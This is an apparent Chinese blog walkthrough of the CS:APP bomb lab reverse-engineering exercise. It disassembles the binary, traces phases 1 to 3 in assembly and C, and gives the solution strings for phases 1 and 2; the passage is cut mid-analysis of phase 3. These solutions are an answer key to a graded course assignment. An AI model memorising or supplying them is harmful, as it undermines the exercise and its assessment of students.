<h1 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h1><p>浏览<code>bomb.c</code>可知，本实验一共有6个关卡，由<code>phase_1</code>为例，该实验的运行格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">      * Let me know how they did it. */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br></pre></td></tr></table></figure>

<p>显然，题目需要从标准输入或者文件输入参数，然后调用<code>phase</code>类函数来检查输入参数是否正确，想要获取到正确的密码，我们需要检查对应的参数储存在哪块地址。</p>
<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>于是使用反汇编<code>bomb</code>可执行程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.asm</span><br></pre></td></tr></table></figure>

<p>在<code>bomb.asm</code>中查找main函数所对应的汇编代码，可以发现如下片段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e32: e8 67 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:    48 89 c7               mov    %rax,%rdi</span><br><span class="line">400e3a:    e8 a1 00 00 00         callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:    e8 80 07 00 00         callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:    bf a8 23 40 00         mov    $0x4023a8,%edi</span><br><span class="line">400e49:    e8 c2 fc ff ff         callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">400e4e:    e8 4b 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:    48 89 c7               mov    %rax,%rdi</span><br></pre></td></tr></table></figure>

<p>在<code>400e32</code>处调用了<code>read_line</code>函数，可以看出是在获取标准输入，下一步执行<code>mov    %rax,%rdi</code>,表示将返回值存入到了<code>%rdi</code>寄存器中，然后立即调用<code>phase_1</code>函数，于是我们找到<code>phase_1</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  400ee4:  be 00 24 40 00         mov    $0x402400,%esi</span><br><span class="line">  400ee9:  e8 4a 04 00 00         callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:  85 c0                  test   %eax,%eax</span><br><span class="line">  400ef0:  74 05                  je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:  e8 43 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:  48 83 c4 08            add    $0x8,%rsp</span><br><span class="line">  400efb:  c3                     retq</span><br></pre></td></tr></table></figure>

<p>观察到<code>phase_1</code>首先将栈顶指针向下移了8位，然后将<code>0x402400</code>地址存入<code>%esi（%rsi）</code>寄存器中，然后调用了<code>strings_not_equal</code>这个函数，然后测试返回值是否为0，如果不为0将栈顶指针加8直接返回，否则直接调用<code>explode_bomb</code>函数（看名字是引爆炸弹），所以我们现在应该去strings_not_equal这个函数内查看:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401338</span> &lt;strings_not_equal&gt;:</span><br><span class="line">  <span class="number">401338</span>:  <span class="number">41</span> <span class="number">54</span>                  push   %r12</span><br><span class="line">  <span class="number">40133</span>a:  <span class="number">55</span>                     push   %rbp</span><br><span class="line">  <span class="number">40133b</span>:  <span class="number">53</span>                     push   %rbx</span><br><span class="line">  <span class="number">40133</span>c:  <span class="number">48</span> <span class="number">89</span> fb               mov    %rdi,%rbx</span><br><span class="line">  <span class="number">40133f</span>:  <span class="number">48</span> <span class="number">89</span> f5               mov    %rsi,%rbp</span><br><span class="line">  <span class="number">401342</span>:  e8 d4 ff ff ff         callq  <span class="number">40131b</span> &lt;string_length&gt;</span><br><span class="line">  <span class="number">401347</span>:  <span class="number">41</span> <span class="number">89</span> c4               mov    %eax,%r12d</span><br><span class="line">  <span class="number">40134</span>a:  <span class="number">48</span> <span class="number">89</span> ef               mov    %rbp,%rdi</span><br><span class="line">  <span class="number">40134</span>d:  e8 c9 ff ff ff         callq  <span class="number">40131b</span> &lt;string_length&gt;</span><br><span class="line">  <span class="number">401352</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">401357</span>:  <span class="number">41</span> <span class="number">39</span> c4               cmp    %eax,%r12d</span><br><span class="line">  <span class="number">40135</span>a:  <span class="number">75</span> <span class="number">3f</span>                  jne    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">40135</span>c:  <span class="number">0f</span> b6 <span class="number">03</span>               movzbl (%rbx),%eax</span><br><span class="line">  <span class="number">40135f</span>:  <span class="number">84</span> c0                  test   %al,%al</span><br><span class="line">  <span class="number">401361</span>:  <span class="number">74</span> <span class="number">25</span>                  je     <span class="number">401388</span> &lt;strings_not_equal+<span class="number">0x50</span>&gt;</span><br><span class="line">  <span class="number">401363</span>:  <span class="number">3</span>a <span class="number">45</span> <span class="number">00</span>               cmp    <span class="number">0x0</span>(%rbp),%al</span><br><span class="line">  <span class="number">401366</span>:  <span class="number">74</span> <span class="number">0</span>a                  je     <span class="number">401372</span> &lt;strings_not_equal+<span class="number">0x3a</span>&gt;</span><br><span class="line">  <span class="number">401368</span>:  eb <span class="number">25</span>                  jmp    <span class="number">40138f</span> &lt;strings_not_equal+<span class="number">0x57</span>&gt;</span><br><span class="line">  <span class="number">40136</span>a:  <span class="number">3</span>a <span class="number">45</span> <span class="number">00</span>               cmp    <span class="number">0x0</span>(%rbp),%al</span><br><span class="line">  <span class="number">40136</span>d:  <span class="number">0f</span> <span class="number">1f</span> <span class="number">00</span>               nopl   (%rax)</span><br><span class="line">  <span class="number">401370</span>:  <span class="number">75</span> <span class="number">24</span>                  jne    <span class="number">401396</span> &lt;strings_not_equal+<span class="number">0x5e</span>&gt;</span><br><span class="line">  <span class="number">401372</span>:  <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>            add    $<span class="number">0x1</span>,%rbx</span><br><span class="line">  <span class="number">401376</span>:  <span class="number">48</span> <span class="number">83</span> c5 <span class="number">01</span>            add    $<span class="number">0x1</span>,%rbp</span><br><span class="line">  <span class="number">40137</span>a:  <span class="number">0f</span> b6 <span class="number">03</span>               movzbl (%rbx),%eax</span><br><span class="line">  <span class="number">40137</span>d:  <span class="number">84</span> c0                  test   %al,%al</span><br><span class="line">  <span class="number">40137f</span>:  <span class="number">75</span> e9                  jne    <span class="number">40136</span>a &lt;strings_not_equal+<span class="number">0x32</span>&gt;</span><br><span class="line">  <span class="number">401381</span>:  ba <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x0</span>,%edx</span><br><span class="line">  <span class="number">401386</span>:  eb <span class="number">13</span>                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">401388</span>:  ba <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x0</span>,%edx</span><br><span class="line">  <span class="number">40138</span>d:  eb <span class="number">0</span>c                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">40138f</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">401394</span>:  eb <span class="number">05</span>                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">401396</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">40139b</span>:  <span class="number">89</span> d0                  mov    %edx,%eax</span><br><span class="line">  <span class="number">40139</span>d:  <span class="number">5b</span>                     pop    %rbx</span><br><span class="line">  <span class="number">40139</span>e:  <span class="number">5</span>d                     pop    %rbp</span><br><span class="line">  <span class="number">40139f</span>:  <span class="number">41</span> <span class="number">5</span>c                  pop    %r12</span><br><span class="line">  <span class="number">4013</span>a1:  c3                     retq</span><br></pre></td></tr></table></figure>

<p>完整的strings_not_equal如上图所示。首先函数将三个寄存器的内容压入栈中进行保护，然后分别将<code>%rdi,%rsi</code>中的内容移入至<code>%rbs,%rbp</code>中，然后调用<code>string_length</code>函数，通过函数名可以猜测该函数用来检测字符串的长度，然后返回时将返回值赋值给<code>%r12d</code>寄存器，随后将<code>%rbp</code>（地址<code>$0x402400</code>）的内容赋值给<code>%rdi</code>,随后几行分别再次调用<code>string_length</code>函数并进行与1的比较，也就是检测字符串的长度是否与目标字符串的长度吻合，如果吻合的话，继续向下执行。否则跳转至：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40139b:  89 d0                  mov    %edx,%eax</span><br><span class="line">40139d:  5b                     pop    %rbx</span><br><span class="line">40139e:  5d                     pop    %rbp</span><br><span class="line">40139f:  41 5c                  pop    %r12</span><br><span class="line">4013a1:  c3                     retq</span><br></pre></td></tr></table></figure>

<p>即返回1。</p>
<p>继续向下观察，发现汇编指令中首先检查输入的首字符是否为空字符，即’/0’，即以下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40135c:  0f b6 03               movzbl (%rbx),%eax</span><br><span class="line">40135f:  84 c0                  test   %al,%al</span><br></pre></td></tr></table></figure>

<p>这里将<code>%rbx</code>中的内容（即标准输入内容）取出，放入<code>%eax</code>中并进行了符号位扩展，如果为0的话就直接向下跳转，因为我们的目的是寻找目标字符串，所以不必管跳转内容，直接向下运行即可。</p>
<p>接着可以观察到以下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmp    0x0(%rbp),%al</span><br></pre></td></tr></table></figure>

<p>即将<code>%rbp</code>(即内存<code>$0x402400</code>中的内容)与标准输入的第一个字符进行比对，由此看来，答案就呼之欲出了！标准密码就藏在地址<code>$0x402400</code>中。</p>
<p>于是我们在命令行使用<code>gdb</code>进行调试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">(gdb) b explode_bomb</span><br><span class="line">(gdb) x&#x2F;s 0x402400&#x2F;*查看密码*&#x2F;</span><br></pre></td></tr></table></figure>

<p>于是命令行输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402400:       &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>

<p>于是运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) run</span><br></pre></td></tr></table></figure>

<p>根据提示输入标准输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Phase 1 defused. How about the next one?</span><br></pre></td></tr></table></figure>

<p>于是第一关就圆满地结束了！</p>
<h3 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h3><p><img src="/2020/04/05/1/phase1.png" alt></p>
<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><h3 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h3><p>同样地，在<code>main</code>函数里寻找关于<code>phase_2</code>函数的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e4e: e8 4b 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:    48 89 c7               mov    %rax,%rdi</span><br><span class="line">400e56:    e8 a1 00 00 00         callq  400efc &lt;phase_2&gt;</span><br><span class="line">400e5b:    e8 64 07 00 00         callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>

<p>可知输入放在了<code>%rdi</code>寄存器中。</p>
<p>下面查询phase_2的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:  55                     push   %rbp</span><br><span class="line">  400efd:  53                     push   %rbx</span><br><span class="line">  400efe:  48 83 ec 28            sub    $0x28,%rsp</span><br><span class="line">  400f02:  48 89 e6               mov    %rsp,%rsi</span><br><span class="line">  400f05:  e8 52 05 00 00         callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:  83 3c 24 01            cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:  74 20                  je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:  e8 25 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:  eb 19                  jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:  8b 43 fc               mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:  01 c0                  add    %eax,%eax</span><br><span class="line">  400f1c:  39 03                  cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:  74 05                  je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:  e8 15 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:  48 83 c3 04            add    $0x4,%rbx</span><br><span class="line">  400f29:  48 39 eb               cmp    %rbp,%rbx</span><br><span class="line">  400f2c:  75 e9                  jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:  eb 0c                  jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:  48 8d 5c 24 04         lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:  48 8d 6c 24 18         lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:  eb db                  jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:  48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">  400f40:  5b                     pop    %rbx</span><br><span class="line">  400f41:  5d                     pop    %rbp</span><br><span class="line">  400f42:  c3                     retq</span><br></pre></td></tr></table></figure>

<p><code>400efe</code>: <code>sub $0x28,%rsp</code> 和 <code>400f02</code>: <code>mov %rsp,%rsi</code> 分配了一块 40 bytes 大小的空间，并将其地址传给了 <code>%rsi</code> 寄存器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rsi &#x3D; %rsp</span><br></pre></td></tr></table></figure>

<p><code>400f05</code>: <code>callq 40145c</code> 调用函数 <code>read_six_numbers</code>。从函数名推测其作用可能为读入 6 个数。</p>
<h4 id="观察函数read-six-numbers"><a href="#观察函数read-six-numbers" class="headerlink" title="观察函数read_six_numbers"></a>观察函数read_six_numbers</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">  401460:  48 89 f2               mov    %rsi,%rdx</span><br><span class="line">  401463:  48 8d 4e 04            lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:  48 8d 46 14            lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:  48 89 44 24 08         mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:  48 8d 46 10            lea    0x10(%rsi),%rax</span><br><span class="line">  401474:  48 89 04 24            mov    %rax,(%rsp)</span><br><span class="line">  401478:  4c 8d 4e 0c            lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:  4c 8d 46 08            lea    0x8(%rsi),%r8</span><br><span class="line">  401480:  be c3 25 40 00         mov    $0x4025c3,%esi</span><br><span class="line">  401485:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40148a:  e8 61 f7 ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:  83 f8 05               cmp    $0x5,%eax</span><br><span class="line">  401492:  7f 05                  jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:  e8 a1 ff ff ff         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line">  40149d:  c3                     retq</span><br></pre></td></tr></table></figure>

<p>先看开始的部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40145c: 48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">401460:    48 89 f2               mov    %rsi,%rdx</span><br><span class="line">401463:    48 8d 4e 04            lea    0x4(%rsi),%rcx</span><br><span class="line">401467:    48 8d 46 14            lea    0x14(%rsi),%rax</span><br><span class="line">40146b:    48 89 44 24 08         mov    %rax,0x8(%rsp)</span><br><span class="line">401470:    48 8d 46 10            lea    0x10(%rsi),%rax</span><br><span class="line">401474:    48 89 04 24            mov    %rax,(%rsp)</span><br><span class="line">401478:    4c 8d 4e 0c            lea    0xc(%rsi),%r9</span><br><span class="line">40147c:    4c 8d 46 08            lea    0x8(%rsi),%r8</span><br></pre></td></tr></table></figure>

<p>译成C语言：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>* pos[<span class="number">3</span>];                       </span><br><span class="line">num0_pos = start_pos;              </span><br><span class="line">num1_pos = start_pos + <span class="number">1</span>;         </span><br><span class="line">tmp_pos  = start_pos + <span class="number">5</span>;          </span><br><span class="line">pos[<span class="number">1</span>]   = tmp_pos; tmp_pos  = start_pos + <span class="number">4</span>; </span><br><span class="line">pos[<span class="number">0</span>] = tmp_pos; </span><br><span class="line">num3_pos = start_pos + <span class="number">3</span>;           </span><br><span class="line">num2_pos = start_pos + <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>于是得到各地址保存的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsi</span><br><span class="line">%rcx &#x3D; %rsi + 4</span><br><span class="line">%r8 &#x3D; %rsi + 8</span><br><span class="line">%r9 &#x3D; %rsi + 12</span><br><span class="line">0x0(%rsp) &#x3D; %rsi + 16</span><br><span class="line">0x8(%rsp) &#x3D; %rsi + 20</span><br></pre></td></tr></table></figure>

<p>由上一节知，%rsi 寄存器存放的是调用者 %rsp 寄存器中的内容，因此这 6 个地址分别对应调用者栈里开始的 6 个连续 int 的地址。</p>
<h4 id="回到phase-2函数部分"><a href="#回到phase-2函数部分" class="headerlink" title="回到phase_2函数部分"></a>回到phase_2函数部分</h4><p>由之前的分析，我们确定了函数 <code>read_six_numbers</code> 的具体作用。此时栈内保存的信息为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0(%rsp) &#x3D; nums[0]</span><br><span class="line">0x4(%rsp) &#x3D; nums[1]</span><br><span class="line">0x8(%rsp) &#x3D; nums[2]</span><br><span class="line">0xc(%rsp) &#x3D; nums[3]</span><br><span class="line">0x10(%rsp) &#x3D; nums[4]</span><br><span class="line">0x14(%rsp) &#x3D; nums[5]</span><br></pre></td></tr></table></figure>

<p>其中，<code>nums[0]</code> ~ <code>nums[5]</code> 表示输入的字符串中解析得到的（前）6 个整数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f0a: 83 3c 24 01            cmpl   $0x1,(%rsp)</span><br><span class="line">400f0e:    74 20                  je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f10:    e8 25 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f15:    eb 19                  jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f17:    8b 43 fc               mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:    01 c0                  add    %eax,%eax</span><br><span class="line">400f1c:    39 03                  cmp    %eax,(%rbx)</span><br><span class="line">400f1e:    74 05                  je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">400f20:    e8 15 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f25:    48 83 c3 04            add    $0x4,%rbx</span><br><span class="line">400f29:    48 39 eb               cmp    %rbp,%rbx</span><br><span class="line">400f2c:    75 e9                  jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f2e:    eb 0c                  jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">400f30:    48 8d 5c 24 04         lea    0x4(%rsp),%rbx</span><br><span class="line">400f35:    48 8d 6c 24 18         lea    0x18(%rsp),%rbp</span><br><span class="line">400f3a:    eb db                  jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f3c:    48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">400f40:    5b                     pop    %rbx</span><br><span class="line">400f41:    5d                     pop    %rbp</span><br><span class="line">400f42:    c3                     retq</span><br></pre></td></tr></table></figure>

<p>这段的结构比较复杂。先直译成含 <code>goto</code> 语句的 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (nums[<span class="number">0</span>] == <span class="number">1</span>)               </span><br><span class="line">    <span class="keyword">goto</span> L_400f30;   </span><br><span class="line">    explode_bomb();    </span><br><span class="line">    <span class="keyword">goto</span> L_400f30;</span><br><span class="line">    L_400f17:                         </span><br><span class="line">    target = *(cur_pos - <span class="number">1</span>);        </span><br><span class="line">	target *= <span class="number">2</span>;    </span><br><span class="line"><span class="keyword">if</span> (*cur_pos == target)        </span><br><span class="line">    <span class="keyword">goto</span> L_400f25;    </span><br><span class="line">explode_bomb(); </span><br><span class="line">L_400f25:                           </span><br><span class="line">cur_pos += <span class="number">1</span>;    </span><br><span class="line"><span class="keyword">if</span> (cur_pos != end_pos)         </span><br><span class="line">    <span class="keyword">goto</span> L_400f17;    </span><br><span class="line"><span class="keyword">goto</span> L_400f3c; L_400f30:                          </span><br><span class="line">cur_pos = nums + <span class="number">1</span>;    </span><br><span class="line">end_pos = nums + <span class="number">6</span>;    </span><br><span class="line"><span class="keyword">goto</span> L_400f17; L_400f3c:                         </span><br><span class="line"><span class="keyword">return</span> target;</span><br></pre></td></tr></table></figure>

<p>整理得到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nums[<span class="number">0</span>] != <span class="number">1</span>)    </span><br><span class="line">explode_bomb(); </span><br><span class="line">end_pos = nums + <span class="number">6</span>;</span><br><span class="line"><span class="keyword">for</span> (cur_pos = nums + <span class="number">1</span>; cur_pos != end_pos; ++cur_pos) </span><br><span class="line">&#123;    </span><br><span class="line">	target = *(cur_pos - <span class="number">1</span>) * <span class="number">2</span>;    </span><br><span class="line"> 	<span class="keyword">if</span> (*cur_pos != target)        </span><br><span class="line">     	explode_bomb(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> target;</span><br></pre></td></tr></table></figure>

<p>通过这段代码，需要输入的 6 个整数就很显然了——第 1 个整数应当为 <code>1</code>，之后的每个整数都是前一个数的 2 倍。于是需要输入的 6 个整数依次为 <code>1</code>, <code>2</code>, <code>4</code>, <code>8</code>, <code>16</code>, <code>32</code>。</p>
<p>由之前的分析，本关密码即为 <code>1 2 4 8 16 32</code>。</p>
<p>在 <code>gdb</code> 中输入 <code>Phase 2</code> 的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">That&#39;s number 2.  Keep going!</span><br></pre></td></tr></table></figure>

<h3 id="运行结果：-1"><a href="#运行结果：-1" class="headerlink" title="运行结果："></a>运行结果：</h3><p><img src="/2020/04/05/1/phase2.png" alt></p>
<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>main函数和前面实验过程一样，直接看<code>phase_3</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">  400f47:  48 8d 4c 24 0c         lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:  48 8d 54 24 08         lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:  be cf 25 40 00         mov    $0x4025cf,%esi</span><br><span class="line">  400f56:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  400f5b:  e8 90 fc ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:  83 f8 01               cmp    $0x1,%eax</span><br><span class="line">  400f63:  7f 05                  jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:  e8 d0 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:  83 7c 24 08 07         cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:  77 3c                  ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:  8b 44 24 08            mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:  ff 24 c5 70 24 40 00   jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:  b8 cf 00 00 00         mov    $0xcf,%eax</span><br><span class="line">  400f81:  eb 3b                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:  b8 c3 02 00 00         mov    $0x2c3,%eax</span><br><span class="line">  400f88:  eb 34                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:  b8 00 01 00 00         mov    $0x100,%eax</span><br><span class="line">  400f8f:  eb 2d                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:  b8 85 01 00 00         mov    $0x185,%eax</span><br><span class="line">  400f96:  eb 26                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:  b8 ce 00 00 00         mov    $0xce,%eax</span><br><span class="line">  400f9d:  eb 1f                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:  b8 aa 02 00 00         mov    $0x2aa,%eax</span><br><span class="line">  400fa4:  eb 18                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:  b8 47 01 00 00         mov    $0x147,%eax</span><br><span class="line">  400fab:  eb 11                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:  e8 88 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  400fb7:  eb 05                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:  b8 37 01 00 00         mov    $0x137,%eax</span><br><span class="line">  400fbe:  3b 44 24 0c            cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:  74 05                  je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:  e8 71 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line">  400fcd:  c3                     retq</span><br></pre></td></tr></table></figure>

<p>首先看到进入函数后首先把栈顶指针%rsp寄存器向下减了8位，然后将（%rsp+8）和（%rsp+12）中的内容存在%rdx和%rcx寄存器中。再往后看，出现了一个奇怪的地址，我们将这个地址打印出来，显示的是“%d %d”，这个同第二题一样，表示我们输入的格式，应该输入两个数，中间使用空格进行区分。</p>
<p>然后调用了<code>&lt;__isoc99_sscanf@plt&gt;</code>函数，将返回值与1进行比较，如果输入的数量大于1，则进行跳转，否则引爆炸弹。经过与前面进行比较与推断，可知分辨要将输入的两个数保存在%rdx和%rcx寄存器中。然后将0x8（%rsp）即%rdx的数值与7进行比较，如果大于7的话，就引爆炸弹，否则继续执行，考虑到跳转指令使用的<code>ja</code>指令，由此可知对应的第一个数的输入范围是[0,7]。向下看，发现将0x8(%rsp)中的值放到了%eax中。</p>
<p>下一条指令使用的是<code>jmpq   *0x402470(,%rax,8)</code>，这是一条switch语句的命令，根据输入的第一个参数的内容对基于<code>*0x402470</code>的首地址进行跳转，第一个参数有八个取值，从0到7，我们逐一测试。</p>
<p>这里以nums[0]取1为例，此时<code>0x402470(,%rax,8)</code>的值为<code>0x402470 + 1 * 8 = 0x402478</code>。使用gdb查看改地址存放的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;g 0x402470 + 1 * 8</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<p><code>0x402478:       0x0000000000400fb9</code></p>
<p>因此 400fb9: <code>mov $0x137,%eax</code> 即为 <code>nums[0]</code> 取 <code>1</code> 时跳转到的语句。</p>
<p>类似地，我们可以得到 <code>nums[0]</code> 取 [0, 7] 时对应的整个跳转表，从而得到以下 C 语言代码：</p>
